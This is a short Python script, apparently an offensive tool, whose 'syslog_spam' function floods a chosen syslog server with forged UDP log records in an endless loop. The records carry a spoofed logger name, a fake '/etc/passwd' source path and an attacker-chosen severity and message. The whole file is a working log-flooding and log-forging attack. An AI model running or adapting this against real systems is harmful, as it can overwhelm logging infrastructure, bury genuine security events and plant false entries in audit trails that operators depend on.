import socket
import logging
import logging.handlers as handlers
class Syslog:
    def syslog_spam(ip,port,level_of_log,logger_username,message_to_send):
        warning_levels = {"1":logging.CRITICAL, "2":logging.ERROR,"3":logging.WARNING,"4":logging.INFO,"5":logging.DEBUG}
        
        my_logger = logging.getLogger("FoxieLogger")
        my_logger.setLevel(warning_levels[level_of_log])
        
        try:
            handler = handlers.SysLogHandler(address=(ip,port),socktype=socket.SOCK_DGRAM)
        except:
            print("Failed to comminucate with server")
            exit()
        my_logger.addHandler(handler)

        log_record = logging.LogRecord("FoxieRecord",my_logger.level,"/etc/passwd",0,"%-"+message_to_send,[],None)
        log_record.name = logger_username
        
        sayac = 0
        while True:
            my_logger.handle(log_record)
            sayac += 1
            print(f"Sent {sayac} Packets as %-"+message_to_send, end='\r')

